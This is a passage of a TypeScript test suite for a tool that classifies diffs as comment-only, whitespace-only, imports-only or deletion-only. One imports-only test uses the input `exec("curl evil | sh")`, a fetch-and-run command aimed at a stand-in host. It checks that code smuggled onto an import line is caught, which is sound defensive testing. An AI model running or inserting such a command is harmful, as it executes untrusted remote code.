    added: 0,
    removed: 0,
    changed: 1,
  });
  expect(judgement!.inputs.firstLineCommentChanged).toBe(true);
});

// A directive is a comment a tool obeys.

test("a directive is a comment a tool obeys: a changed directive gives no comment-only judgement", () => {
  const before = "// @ts-ignore\nfoo();\n";
  const after = "// @ts-expect-error\nfoo();\n";
  const rules = rulesOf(one(before, after), {
    tokens: (text) => tokensOf(text, { tweak: directives(text) }),
  });
  expect(outcomes(rules, "comment-only")).toEqual([]);
  expect(outcomes(rules, "whitespace-only")).toEqual([]);
});

test("a directive is a comment a tool obeys: prose beside an unchanged directive holds", () => {
  const before = "// @ts-ignore\nfoo();\n";
  const after = "// @ts-ignore\n// why\nfoo();\n";
  const rules = rulesOf(one(before, after), {
    tokens: (text) => tokensOf(text, { tweak: directives(text) }),
  });
  expect(outcomes(rules, "comment-only")).toEqual([["holds", null]]);
});

test("a directive is a comment a tool obeys: without the flag comment-only is not evaluated", () => {
  const rules = rulesOf(
    one(
      "function f() {\n  return 1;\n}\n",
      "function f() {\n  // one\n  return 1;\n}\n",
    ),
    { directivesFlagged: false },
  );
  expect(outcomes(rules, "comment-only")).toEqual([
    ["not-evaluated", "directives-not-flagged"],
  ]);
});

test("a directive is a comment a tool obeys: `//go:build` against `// go:build` is not whitespace-only", () => {
  const before = "//go:build linux\npackage a\n";
  const after = "// go:build linux\npackage a\n";
  // Flagged or not, the comment's text differs, which whitespace-only does not let pass.
  for (const flagged of [true, false]) {
    const rules = rulesOf(one(before, after, "a.go"), {
      directivesFlagged: flagged,
      // Only an engine that flags directives sets the bit.
      tokens: (text) =>
        tokensOf(text, flagged ? { tweak: directives(text) } : {}),
    });
    expect(outcomes(rules, "whitespace-only")).toEqual([]);
    expect(outcomes(rules, "comment-only")).toEqual(
      flagged ? [] : [["not-evaluated", "directives-not-flagged"]],
    );
  }
});

test("a comment opened on one changed row and closed on another swallows the rows between: no judgement", () => {
  // Why: the unchanged \`return x;\` between the two runs is commented out; the comment leaf reaches
  // lines outside each run's own rows and has no pair, so the runs change a token.
  const rules = rulesOf(
    one(
      "function f() {\n  doA();\n  return x;\n}\n",
      "function f() {\n  doA();\n  /*\n  return x;\n  */\n}\n",
    ),
  );
  expect(outcomes(rules, "comment-only")).toEqual([]);
  expect(outcomes(rules, "whitespace-only")).toEqual([]);
});

test("a directive is a comment a tool obeys: one moved to another statement in a run is a change", () => {
  // Why: \`# type: ignore\` applies to the statement on its line; moved to the next statement, it
  // silences another line. Directives are compared in their place among the tokens.
  const before = "x = f()  # type: ignore\ny = g()\n";
  const after = "x = f()\ny = g()  # type: ignore\n";
  const flagged = rulesOf(one(before, after, "a.py"), {
    tokens: (text) => tokensOf(text, { tweak: directives(text) }),
  });
  expect(outcomes(flagged, "whitespace-only")).toEqual([]);
  expect(outcomes(flagged, "comment-only")).toEqual([]);
  // Without the flag, whitespace-only still compares every comment in its place.
  const plain = rulesOf(one(before, after, "a.py"), {
    directivesFlagged: false,
  });
  expect(outcomes(plain, "whitespace-only")).toEqual([]);
  expect(outcomes(plain, "comment-only")).toEqual([
    ["not-evaluated", "directives-not-flagged"],
  ]);
});

test("a directive is a comment a tool obeys: flagged on one side only is not evaluated", () => {
  // Why: whether directives are flagged is said per record; both sides must say it.
  const before = "function f() {\n  return 1;\n}\n";
  const rules = rulesOf(
    one(before, "function f() {\n  // one\n  return 1;\n}\n"),
    { directivesFlagged: (text) => text !== before },
  );
  expect(outcomes(rules, "comment-only")).toEqual([
    ["not-evaluated", "directives-not-flagged"],
  ]);
  expect(only(rules, "comment-only")[0]!.inputs.directivesFlagged).toEqual({
    old: false,
    new: true,
  });
});

// --- imports-only -------------------------------------------------------------------------------

const answers = (
  table: Readonly<Record<string, ImportTargetAnswer>>,
  nearest = true,
): SectionRelations => ({
  importTarget: (_side, _path, specifier) =>
    table[specifier] ?? { kind: "file", path: `${specifier}.ts` },
  slice: () => undefined,
  manifestIsNearest: () => nearest,
});
const FILES = answers({});

const importsOf = (rules: ReadonlyArray<SectionRuleJudgement>) =>
  only(rules, "imports-only");

test("imports-only holds for an added value import of a new module, and says it loads one", () => {
  const rules = rulesOf(
    one(
      'import { a } from "./a";\n',
      'import { a } from "./a";\nimport { b } from "./b";\n',
    ),
    { relations: FILES },
  );
  const [judgement] = importsOf(rules);
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs).toMatchObject({
    added: [
      {
        specifier: "./b",
        imported: "b",
        local: "b",
        typeOnly: false,
        target: { kind: "file", path: "./b.ts" },
      },
    ],
    removed: [],
    newModuleLoads: ["./b"],
    droppedModuleLoads: [],
    typeOnlyChangesOnly: false,
    addedFile: false,
  });
});

test("imports-only holds for an added file's import block, and says the file is added", () => {
  const rules = rulesOf(
    one("", 'import { a } from "./a";\nimport b from "node:fs";\n'),
    {
      relations: answers({ "node:fs": { kind: "builtin" } }),
    },
  );
  const [judgement] = importsOf(rules);
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.addedFile).toBe(true);
  expect(judgement!.inputs.newModuleLoads).toEqual(["./a", "node:fs"]);
  expect(judgement!.statement).toContain("of the added file");
});

test("imports-only holds for a type-only addition and says only type-only bindings changed", () => {
  const rules = rulesOf(
    one(
      'import { a } from "./a";\n',
      'import { a } from "./a";\nimport type { T } from "./t";\n',
    ),
    { relations: FILES },
  );
  const [judgement] = importsOf(rules);
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.typeOnlyChangesOnly).toBe(true);
  expect(judgement!.inputs.newModuleLoads).toEqual([]);
});

test("imports-only lists a dropped last value import of a module", () => {
  const rules = rulesOf(
    one(
      'import { a } from "./a";\nimport { b } from "./b";\n\na();\n',
      'import { a } from "./a";\n\na();\n',
    ),
    { relations: FILES },
  );
  const [judgement] = importsOf(rules);
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.droppedModuleLoads).toEqual(["./b"]);
  expect(judgement!.inputs.removed).toEqual([
    {
      specifier: "./b",
      imported: "b",
      local: "b",
      typeOnly: false,
      place: "root",
    },
  ]);
});

test("imports-only is not held for a side-effect import on one side only", () => {
  const rules = rulesOf(
    one(
      'import { a } from "./a";\n',
      'import { a } from "./a";\nimport "./polyfill";\n',
    ),
    { relations: FILES },
  );
  expect(outcomes(rules, "imports-only")).toEqual([
    ["not-held", "side-effect-import"],
  ]);
});

test("imports-only is not held where names are unknown, or a local name is inferred", () => {
  const before = 'import { a } from "./a";\n';
  const after = 'import { a } from "./a";\nimport { b } from "./b";\n';
  for (const change of ["names-unknown", "local-inferred"] as const) {
    const rules = rulesOf(one(before, after), {
      relations: FILES,
      tokens: (text) =>
        tokensOf(text, {
          imports: importsIn(text).map((statement) =>
            statement.specifier === "./b"
              ? {
                  ...statement,
                  namesUnknown: change === "names-unknown",
                  bindings: statement.bindings.map((binding) => ({
                    ...binding,
                    localInferred: change === "local-inferred",
                  })),
                }
              : statement,
          ),
        }),
    });
    expect(outcomes(rules, "imports-only")).toEqual([
      ["not-held", "names-unknown"],
    ]);
  }
});

test("imports-only is not held when a removed name is still an identifier in the head file", () => {
  const rules = rulesOf(
    one(
      'import { a } from "./a";\nimport { b } from "./b";\n\nb();\n',
      'import { a } from "./a";\n\nb();\n',
    ),
    { relations: FILES },
  );
  expect(outcomes(rules, "imports-only")).toEqual([
    ["not-held", "removed-name-still-used"],
  ]);
});

/** A record of `text` with one more leaf over bytes `start`..`end`, of `type`, flags 0. */
const withLeaf = (
  text: string,
  start: number,
  end: number,
  type: string,
): GraphFileTokens => {
  const record = tokensOf(text) as GraphFileTokens & { status: "available" };
  const bytes = encoder.encode(text);
  const lineOf = (offset: number) =>
    1 + bytes.subarray(0, offset).filter((byte) => byte === 10).length;
  const leafTypes = [...record.leafTypes, type];
  const at = record.leaves.findIndex((row) => row[1] >= end);
  const row = [
    leafTypes.length - 1,
    start,
    end,
    lineOf(start),
    lineOf(end - 1),
    0,
    0,
    0,
  ] as const;
  const leaves = [...record.leaves];
  leaves.splice(at === -1 ? leaves.length : at, 0, row);
  return { ...record, leafTypes, leaves };
};

test("a leaf of line feeds only on an import row is layout; a leaf of spaces only there is a token outside the import", () => {
  // Why: Go ends a statement with a leaf that is a line feed, which holds no code; but string and
  // template whitespace can be leaves too, and a leaf of spaces outside every import is something
  // the rule cannot account for.
  const base = 'import { a } from "./a";\n';
  const feed = 'import { a } from "./a";\nimport { b } from "./b";\n';
  const spaces = 'import { a } from "./a";\nimport { b } from "./b";   \n';
  const feedAt = feed.length - 1;
  const spacesAt = spaces.length - 4;
  expect(
    outcomes(
      rulesOf(one(base, feed), {
        relations: FILES,
        tokens: (text) =>
          text === feed
            ? withLeaf(feed, feedAt, feedAt + 1, "\n")
            : tokensOf(text),
      }),
      "imports-only",
    ),
  ).toEqual([["holds", null]]);
  expect(
    outcomes(
      rulesOf(one(base, spaces), {
        relations: FILES,
        tokens: (text) =>
          text === spaces
            ? withLeaf(spaces, spacesAt, spacesAt + 3, "string_fragment")
            : tokensOf(text),
      }),
      "imports-only",
    ),
  ).toEqual([]);
});

test("imports-only is not evaluated where a binding does not fit its file: a name holding whitespace, or a spelled local name that is no identifier of the file", () => {
  // Why: a binding cut from raw text (the engine once gave \`"os "\` for \`import os . path\`) or
  // naming what the file never spells cannot be compared with the file's identifiers, so a
  // removed, still-used name could read as unused. An inferred local (Go, no alias) is not spelled
  // and already keeps the rule from deciding, so it is no misfit.
  const before = 'import { a } from "./a";\n';
  const after = 'import { a } from "./a";\nimport { b } from "./b";\n';
  const bending =
    (change: (binding: GraphImportBinding) => GraphImportBinding) =>
    (text: string) =>
      tokensOf(text, {
        imports: importsIn(text).map((statement) =>
          statement.specifier === "./b"
            ? { ...statement, bindings: statement.bindings.map(change) }
            : statement,
        ),
      });
  const result = (
    change: (binding: GraphImportBinding) => GraphImportBinding,
  ) =>
    rulesOf(one(before, after), { relations: FILES, tokens: bending(change) });
  const spaced = result((binding) => ({ ...binding, local: "b " }));
  expect(outcomes(spaced, "imports-only")).toEqual([
    ["not-evaluated", "binding-not-in-file"],
  ]);
  expect(only(spaced, "imports-only")[0]!.inputs.unfit).toEqual([
    {
      side: "new",
      specifier: "./b",
      imported: "b",
      local: "b ",
      localInferred: false,
    },
  ]);
  expect(
    outcomes(
      result((binding) => ({ ...binding, imported: "b c" })),
      "imports-only",
    ),
  ).toEqual([["not-evaluated", "binding-not-in-file"]]);
  expect(
    outcomes(
      result((binding) => ({ ...binding, local: "elsewhere" })),
      "imports-only",
    ),
  ).toEqual([["not-evaluated", "binding-not-in-file"]]);
  expect(
    outcomes(
      result((binding) => ({
        ...binding,
        local: "elsewhere",
        localInferred: true,
      })),
      "imports-only",
    ),
  ).toEqual([["not-held", "names-unknown"]]);
  // A removed binding on the base side is checked against the base file's names.
  expect(
    outcomes(
      rulesOf(one(after, before), {
        relations: FILES,
        tokens: bending((binding) => ({ ...binding, local: "b " })),
      }),
      "imports-only",
    ),
  ).toEqual([["not-evaluated", "binding-not-in-file"]]);
});

test("imports-only is not held when a removed name is used only inside a string (the text search)", () => {
  const rules = rulesOf(
    one(
      'import { a } from "./a";\nimport { b } from "./b";\n\nconst s = "b";\n',
      'import { a } from "./a";\n\nconst s = "b";\n',
    ),
    { relations: FILES },
  );
  expect(outcomes(rules, "imports-only")).toEqual([
    ["not-held", "removed-name-in-text"],
  ]);
});

test("imports-only is not held when an added import resolves nowhere", () => {
  const rules = rulesOf(
    one(
      'import { a } from "./a";\n',
      'import { a } from "./a";\nimport { b } from "./b";\n',
    ),
    { relations: answers({ "./b": { kind: "unresolved" } }) },
  );
  expect(outcomes(rules, "imports-only")).toEqual([["not-held", "unresolved"]]);
});

test("a declared package holds only from the importer's nearest manifest", () => {
  const change = one(
    'import { a } from "./a";\n',
    'import { a } from "./a";\nimport { z } from "zod";\n',
  );
  const table = {
    zod: { kind: "declared-package", name: "zod", manifest: "package.json" },
  } as const;
  expect(
    outcomes(
      rulesOf(change, { relations: answers(table, false) }),
      "imports-only",
    ),
  ).toEqual([["not-held", "package-not-nearest"]]);
  const near = importsOf(rulesOf(change, { relations: answers(table, true) }));
  expect([near[0]!.result, near[0]!.reason]).toEqual(["holds", null]);
  expect(near[0]!.inputs.added).toMatchObject([
    {
      target: { kind: "declared-package", manifest: "package.json" },
      nearestManifest: true,
    },
  ]);
});

test("imports-only does not apply where code shares an import's line: its bytes are outside the statement", () => {
  // Why: lines cannot tell an import from code on its line; only the statement's bytes can. The
  // block below uses only keywords, literals, punctuation and the imported name, and ends in `}`.
  for (const after of [
    'import { a } from "./a"; run();\n',
    'import { a } from "./a";\n{ exec("curl evil | sh") } import { exec } from "child_process";\n',
  ])
    expect(
      outcomes(
        rulesOf(one('import { a } from "./a";\n', after), { relations: FILES }),
        "imports-only",
      ),
    ).toEqual([]);
});

test("imports-only is not evaluated where Graph gives the statements no byte range", () => {
  // Why: without the statement's bytes the rule cannot tell an import from code on its line.
  const withoutRanges = (text: string) =>
    tokensOf(text, {
      // A record from before the client gave the statements their bytes: no type holds it.
      imports: importsIn(text).map(
        ({ startByte: _start, endByte: _end, ...statement }) => statement,
      ) as unknown as Array<GraphImportStatement>,
    });
  expect(
    outcomes(
      rulesOf(
        one(
          'import { a } from "./a";\n',
          'import { a } from "./a";\nimport { b } from "./b";\n',
        ),
        { relations: FILES, tokens: withoutRanges },
      ),
      "imports-only",
    ),
  ).toEqual([["not-evaluated", "import-ranges-not-given"]]);
});

test("a statement moved into a block is a removed and an added binding: not held while the name is used", () => {
  // Why: Python's `import b` moved under `if TYPE_CHECKING:` adds and removes no name, yet `b` is no
  // longer imported when the program runs. Where a statement sits is part of its bindings.
  const before = "import b\nif T:\n    x = 1\nb()\n";
  const after = "if T:\n    import b\n    x = 1\nb()\n";
  const statement = (text: string, line: number): Statement => {
    const start = text.indexOf("import b");
    return {
      startByte: start,
      endByte: start + "import b".length,
      startLine: line,
      endLine: line,
      specifier: "b",
      bindings: [
        { imported: "*", local: "b", typeOnly: false, localInferred: false },
      ],
      sideEffectOnly: false,
      namesUnknown: false,
    };
  };
  const tokens =
    (moved: boolean) =>
    (text: string): GraphFileTokens =>
      text === before
        ? tokensOf(text, { imports: [statement(text, 1)] })
        : tokensOf(text, {
            imports: [statement(text, 2)],
            // In the head, the statement's leaves sit under the `if` block.
            tweak: (piece) =>
              moved && piece.start >= 10 && piece.end <= 18
                ? { chain: "if-block" }
                : {},
          });
  const [judgement] = importsOf(
    rulesOf(one(before, after, "a.py"), {
      relations: FILES,
      tokens: tokens(true),
    }),
  );
  expect([judgement!.result, judgement!.reason]).toEqual([
    "not-held",
    "removed-name-still-used",
  ]);
  expect(judgement!.inputs.removed).toEqual([
    {
      specifier: "b",
      imported: "*",
      local: "b",
      typeOnly: false,
      place: "root",
    },
  ]);
  // The control: the same rows with the statement's place unchanged hold.
  expect(
    outcomes(
      rulesOf(one(before, after, "a.py"), {
        relations: FILES,
        tokens: tokens(false),
      }),
      "imports-only",
    ),
  ).toEqual([["holds", null]]);
});

test("adding an import above the first import of a file is still imports-only", () => {
  // Why: the first leaf of a file opens the file's root node, so a statement put before the old
  // first import changes that import's opens but not where it sits; a binding's place is its
  // statement's ancestors hash alone, and the old import is neither removed nor added.
  const firstOpensRoot = (text: string) =>
    tokensOf(text, {
      tweak: (_piece, index) => (index === 0 ? { opens: 2 } : {}),
    });
  const [judgement] = importsOf(
    rulesOf(
      one(
        'import { b } from "./b";\n',
        'import { a } from "./a";\nimport { b } from "./b";\n',
      ),
      { relations: FILES, tokens: firstOpensRoot },
    ),
  );
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.added).toMatchObject([
    { specifier: "./a", local: "a", place: "root" },
  ]);
  expect(judgement!.inputs.removed).toEqual([]);
});

/** Python's `import name` statements, one per line, with their bytes. */
const pythonImports = (source: string): Array<Statement> => {
  let offset = 0;
  return source.split("\n").flatMap((line, index): Array<Statement> => {
    const lineStart = offset;
    offset += line.length + 1;
    const found = /^(\s*)import (\w+)$/.exec(line);
    if (found === null) return [];
    return [
      {
        startByte: lineStart + found[1]!.length,
        endByte: lineStart + line.length,
        startLine: index + 1,
        endLine: index + 1,
        specifier: found[2]!,
        bindings: [
          {
            imported: "*",
            local: found[2]!,
            typeOnly: false,
            localInferred: false,
          },
        ],
        sideEffectOnly: false,
        namesUnknown: false,
      },
    ];
  });
};

/** `import { … } from "x";` statements over any number of lines, with their bytes. */
const blockImports = (source: string): Array<Statement> =>
  [...source.matchAll(/import \{([^}]*)\} from "([^"]+)";/g)].map((match) => {
    const lineAt = (offset: number) =>
      source.slice(0, offset).split("\n").length;
    const end = match.index + match[0].length;
    return {
      startByte: match.index,
      endByte: end,
      startLine: lineAt(match.index),
      endLine: lineAt(end - 1),
      specifier: match[2]!,
      bindings: match[1]!
        .split(",")
        .map((name) => name.trim())
        .filter(Boolean)
        .map((name) => ({
          imported: name,
          local: name,
          typeOnly: false,
          localInferred: false,
        })),
      sideEffectOnly: false,
      namesUnknown: false,
    };
  });

const blockRules = (before: string, after: string) =>
  importsOf(
    rulesOf(one(before, after), {
      relations: FILES,
      tokens: (text) => tokensOf(text, { imports: blockImports(text) }),
    }),
  );

test("a name added inside a multi-line import adds exactly one binding", () => {
  // Why: the changed row touches only the head statement; its counterpart in the base, found through
  // the hunk's unchanged first line, joins the comparison, so the kept names are not read as added.
  const [judgement] = blockRules(
    'import {\n  c,\n} from "./x";\n\nc();\n',
    'import {\n  b,\n  c,\n} from "./x";\n\nc();\n',
  );
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.added).toMatchObject([{ local: "b" }]);
  expect(judgement!.inputs.removed).toEqual([]);
});

test("an unused name removed from a multi-line import removes exactly one binding and holds; a used one is not held", () => {
  // Why: removing one unused name is among the commonest edits; the kept names must not read as
  // removed. A name still used after its removal is a removal the rule must refuse.
  const [unused] = blockRules(
    'import {\n  b,\n  c,\n} from "./x";\n\nc();\n',
    'import {\n  c,\n} from "./x";\n\nc();\n',
  );
  expect([unused!.result, unused!.reason]).toEqual(["holds", null]);
  expect(unused!.inputs.removed).toMatchObject([{ local: "b" }]);
  expect(unused!.inputs.added).toEqual([]);
  const [used] = blockRules(
    'import {\n  b,\n  c,\n} from "./x";\n\nb();\n',
    'import {\n  c,\n} from "./x";\n\nb();\n',
  );
  expect([used!.result, used!.reason]).toEqual([
    "not-held",
    "removed-name-still-used",
  ]);
  expect(used!.inputs.removed).toMatchObject([{ local: "b" }]);
});

/** A multi-line import of `names`, one per line, from "./x". */
const importOf = (names: ReadonlyArray<string>) =>
  `import {\n${names.map((name) => `  ${name},\n`).join("")}} from "./x";\n`;

test("a name removed on the sixth line of a ten-line import finds its counterpart, beyond the hunk's context", () => {
  // Why: long imports are common; the statement's first line is outside the hunk, and the file's line
  // map still finds the head statement, so only the one name reads as removed.
  const kept = ["a1", "a2", "a3", "a4"];
  const rest = ["a5", "a6", "a7"];
  const [judgement] = blockRules(
    importOf([...kept, "b", ...rest]),
    importOf([...kept, ...rest]),
  );
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.removed).toMatchObject([{ local: "b" }]);
  expect(judgement!.inputs.added).toEqual([]);
});

test("a statement whose first line sits in an earlier hunk's context finds its counterpart", () => {
  // Why: the first hunk's unchanged row maps the statement's first line one to one.
  const kept = ["a1", "a2", "a3", "a4"];
  const rules = importsOf(
    rulesOf(
      one(
        `x();\n${importOf([...kept, "b", "a5"])}`,
        `y();\n${importOf([...kept, "a5"])}`,
      ),
      {
        relations: FILES,
        tokens: (text) => tokensOf(text, { imports: blockImports(text) }),
      },
    ),
  );
  expect(
    rules.map((judgement) => [judgement.result, judgement.reason]),
  ).toEqual([["holds", null]]);
  expect(rules[0]!.inputs.removed).toMatchObject([{ local: "b" }]);
});

test("an earlier hunk that adds lines shifts the counterpart's line by its offset", () => {
  // Why: outside every hunk a line maps by the running offset of the hunks before it; without it the
  // head statement would be looked for two lines too early and not found.
  const kept = ["a1", "a2", "a3"];
  const rules = importsOf(
    rulesOf(
      one(
        `q();\n\n${importOf([...kept, "b", "a4"])}`,
        `z();\nw();\nq();\n\n${importOf([...kept, "a4"])}`,
      ),
      {
        relations: FILES,
        tokens: (text) => tokensOf(text, { imports: blockImports(text) }),
      },
    ),
  );
  expect(
    rules.map((judgement) => [judgement.result, judgement.reason]),
  ).toEqual([["holds", null]]);
  expect(rules[0]!.inputs.removed).toMatchObject([{ local: "b" }]);
});

/** Python's `import a, b`: one statement per module, all sharing the statement's lines and bytes. */
const pythonModules = (source: string): Array<Statement> => {
  let offset = 0;
  return source.split("\n").flatMap((line, index): Array<Statement> => {
    const lineStart = offset;
    offset += line.length + 1;
    const found = /^import ([\w, ]+)$/.exec(line);
    if (found === null) return [];
    return found[1]!.split(",").map((name) => ({
      startByte: lineStart,
      endByte: lineStart + line.length,
      startLine: index + 1,
      endLine: index + 1,
      specifier: name.trim(),
      bindings: [
        {
          imported: "*",
          local: name.trim(),
          typeOnly: false,
          localInferred: false,
        },
      ],
      sideEffectOnly: false,
      namesUnknown: false,
    }));
  });
};

const modulesRules = (
  before: string,
  after: string,
  relations: SectionRelations = FILES,
) =>
  importsOf(
    rulesOf(one(before, after, "a.py"), {
      relations,
      tokens: (text) => tokensOf(text, { imports: pythonModules(text) }),
    }),
  );

test("a leaf touches every statement whose bytes hold it: a module added to `import a, b` is checked", () => {
  // Why: Graph gives \`import os, sys\` as one statement per module over the same bytes; taking only
  // the first would read \`sys\` to \`subprocess\` as no change, and the new module's target unchecked.
  const [judgement] = modulesRules(
    "import os, sys\nos.getcwd()\n",
    "import os, subprocess\nos.getcwd()\n",
    answers({ subprocess: { kind: "unresolved" } }),
  );
  expect([judgement!.result, judgement!.reason]).toEqual([
    "not-held",
    "unresolved",
  ]);
  expect(judgement!.inputs.added).toMatchObject([{ specifier: "subprocess" }]);
  expect(judgement!.inputs.removed).toMatchObject([{ specifier: "sys" }]);
});

test("a module removed from `import a, b` while still used is not held", () => {
  // Why: the removed \`sys\` lies in the second statement over the same bytes; it is still called.
  const [judgement] = modulesRules(
    "import os, sys\nos.getcwd()\nsys.exit()\n",
    "import os\nos.getcwd()\nsys.exit()\n",
  );
  expect([judgement!.result, judgement!.reason]).toEqual([
    "not-held",
    "removed-name-still-used",
  ]);
  expect(judgement!.inputs.removed).toMatchObject([{ specifier: "sys" }]);
});

test("an unchanged `import a, b` beside another changed import does not join the comparison", () => {
  // Why: the control; only the statements the change touches, and their counterparts, are compared.
  const [judgement] = modulesRules(
    "import os, sys\nimport json\n",
    "import os, sys\nimport re\n",
  );
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.added).toMatchObject([{ specifier: "re" }]);
  expect(judgement!.inputs.removed).toMatchObject([{ specifier: "json" }]);
});

test("every statement starting on a counterpart line joins the comparison", () => {
  // Why: \`import a; from x import (\` starts two statements on one line; a name added inside the
  // second finds both counterparts, and each brings in the statements starting with it, so \`a\`
  // is not read as removed.
  const before = "import a; from x import (\n    b,\n    c,\n)\n";
  const after = "import a; from x import (\n    b,\n    c,\n    d,\n)\n";
  const statements = (text: string): Array<Statement> => {
    const from = text.indexOf("from");
    const end = text.indexOf(")") + 1;
    const names = [...text.slice(from, end).matchAll(/^\s+(\w+),$/gm)].map(
      (match) => match[1]!,
    );
    return [
      {
        startByte: 0,
        endByte: "import a".length,
        startLine: 1,
        endLine: 1,
        specifier: "a",
        bindings: [
          { imported: "*", local: "a", typeOnly: false, localInferred: false },
        ],
        sideEffectOnly: false,
        namesUnknown: false,
      },
      {
        startByte: from,
        endByte: end,
        startLine: 1,
        endLine: text.slice(0, end).split("\n").length,
        specifier: "x",
        bindings: names.map((name) => ({
          imported: name,
          local: name,
          typeOnly: false,
          localInferred: false,
        })),
        sideEffectOnly: false,
        namesUnknown: false,
      },
    ];
  };
  const [judgement] = importsOf(
    rulesOf(one(before, after, "a.py"), {
      relations: FILES,
      tokens: (text) => tokensOf(text, { imports: statements(text) }),
    }),
  );
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.added).toMatchObject([{ local: "d" }]);
  expect(judgement!.inputs.removed).toEqual([]);
});

test("one of two equal local imports removed is a removal, though another statement keeps the same binding", () => {
  // Why: both statements sit in a function body, so their bindings are equal; compared as sets over
  // the file the removal would vanish, yet \`f\` lost its import. The touched statements' bindings
  // are compared as multisets.
  const before =
    "def f():\n    import json\n    return json.dumps(1)\ndef g():\n    import json\n    return json.dumps(2)\n";
  const after =
    "def f():\n    return json.dumps(1)\ndef g():\n    import json\n    return json.dumps(2)\n";
  const inBody = (source: string) => (piece: Piece) => {
    const line = source.slice(0, piece.start).split("\n").length;
    return pythonImports(source).some(
      (statement) => statement.startLine === line,
    )
      ? { chain: "function-body" }
      : {};
  };
  const [judgement] = importsOf(
    rulesOf(one(before, after, "a.py"), {
      relations: FILES,
      tokens: (text) =>
        tokensOf(text, { imports: pythonImports(text), tweak: inBody(text) }),
    }),
  );
  expect([judgement!.result, judgement!.reason]).toEqual([
    "not-held",
    "removed-name-still-used",
  ]);
  expect(judgement!.inputs.removed).toEqual([
    {
      specifier: "json",
      imported: "*",
      local: "json",
      typeOnly: false,
      place: "function-body",
    },
  ]);
});

test("an import moved to another section is a removal there and an addition here", () => {
  // Why: each section's bindings are its own; the removed-name checks decide the removal.
  const filler = "pass\n".repeat(6);
  const before = `import json\n${filler}x = 1\n`;
  const after = `${filler}import json\nx = 1\n`;
  const rules = rulesOf(one(before, after, "a.py"), {
    relations: FILES,
    tokens: (text) => tokensOf(text, { imports: pythonImports(text) }),
  });
  expect(outcomes(rules, "imports-only")).toEqual([
    ["not-held", "removed-name-still-used"],
    ["holds", null],
  ]);
});

test("a directive is a comment a tool obeys: one on a changed import row is not held, prose is allowed", () => {
  const plainImport = 'import { a } from "./a";\n';
  const flagged = (text: string) => tokensOf(text, { tweak: directives(text) });
  expect(
    outcomes(
      rulesOf(
        one(
          'import { a } from "./a"; // eslint-disable-line no-unused-vars\n',
          plainImport,
        ),
        { relations: FILES, tokens: flagged },
      ),
      "imports-only",
    ),
  ).toEqual([["not-held", "directive-comment-changed"]]);
  expect(
    outcomes(
      rulesOf(one(plainImport, 'import { a } from "./a"; // the a\n'), {
        relations: FILES,
        tokens: flagged,
      }),
      "imports-only",
    ),
  ).toEqual([["holds", null]]);
  // Where Graph does not flag directives for the file, any comment on a changed row refuses.
  expect(
    outcomes(
      rulesOf(one(plainImport, 'import { a } from "./a"; // the a\n'), {
        relations: FILES,
        directivesFlagged: false,
      }),
      "imports-only",
    ),
  ).toEqual([["not-evaluated", "directives-not-flagged"]]);
});

test("imports-only is not evaluated without relations, or where Graph gives no answer", () => {
  const change = one(
    'import { a } from "./a";\n',
    'import { a } from "./a";\nimport { b } from "./b";\n',
  );
  expect(outcomes(rulesOf(change), "imports-only")).toEqual([
    ["not-evaluated", "relations-not-read"],
  ]);
  const cases: Array<[ImportTargetAnswer, SectionRuleJudgement["reason"]]> = [
    [{ kind: "not-classified" }, "import-not-classified"],
    [
      { kind: "side-not-read", gap: { gap: "over-bound", tag: null } },
      "import-side-not-read",
    ],
    [
      { kind: "file-not-read", reason: "under-gitlink", failures: [] },
      "import-file-not-read",
    ],
    [{ kind: "not-found" }, "import-not-found"],
    [
      { kind: "classification-unavailable" },
      "import-classification-unavailable",
    ],
  ];
  for (const [answer, reason] of cases)
    expect(
      outcomes(
        rulesOf(change, { relations: answers({ "./b": answer }) }),
        "imports-only",
      ),
    ).toEqual([["not-evaluated", reason]]);
});

test("imports-only gives nothing where a changed row holds a token outside every import", () => {
  const rules = rulesOf(
    one(
      'import { a } from "./a";\n\na();\n',
      'import { a } from "./a";\n\na(1);\n',
    ),
    { relations: FILES },
  );
  expect(outcomes(rules, "imports-only")).toEqual([]);
});

// --- deletion-only ------------------------------------------------------------------------------

const symbolOf = (
  name: string,
  still: SliceSymbol["stillPointingOnBase"],
): SliceSymbol => ({
  symbol: {
    id: `src/a.ts#${name}`,
    name,
    qualifiedName: name,
    kind: "function",
    startLine: 2,
    endLine: 2,
  },
  innermost: true,
  counterpart: { rule: "none", symbol: null },
  callers: { evidence: "none" },
  testCallers: { evidence: "none" },
  ...(still === undefined ? {} : { stillPointingOnBase: still }),
  changedEdges: [],
  unsupportedMatchesNotUsed: 0,
});

const sliceOf = (
  key: string,
  base: "read" | "gap",
  symbols: ReadonlyArray<SliceSymbol>,
): RelationSlice => {
  const gap = { kind: "gap", gap: "over-bound", tag: null } as const;
  return {
    key,
    base: {
      read:
        base === "gap"
          ? gap
          : {
              kind: "read",
              commit: "c",
              tree: "t",
              profile: "full",
              engine: {
                name: "entire-graph",
                version: "1",
                identityRevision: "4",
                sha256: "0".repeat(64),
              },
            },
      paths:
        base === "gap"
          ? []
          : [
              {
                path: "src/a.ts",
                snapshot: {
                  kind: "read",
                  language: "TypeScript",
                  tier: "semantic",
                  parsed: true,
                  failures: [],
                },
              },
            ],
      ranges: [],
      symbols,
    },
    head: { read: gap, paths: [], ranges: [], symbols: [] },
    counterpartRule: COUNTERPART_RULE,
    blindSpots: STANDING_BLIND_SPOTS,
  };
};

const deletionOf = (slice: (key: string) => RelationSlice | undefined) =>
  only(
    rulesOf(
      one("keep();\nfunction gone() {}\nkeep();\n", "keep();\nkeep();\n"),
      {
        noTokens: true,
        relations: { ...FILES, slice },
      },
    ),
    "deletion-only",
  );

test("deletion-only holds with the base callers that still pointed at a removed symbol", () => {
  const [judgement] = deletionOf((key) =>
    sliceOf(key, "read", [
      symbolOf("gone", {
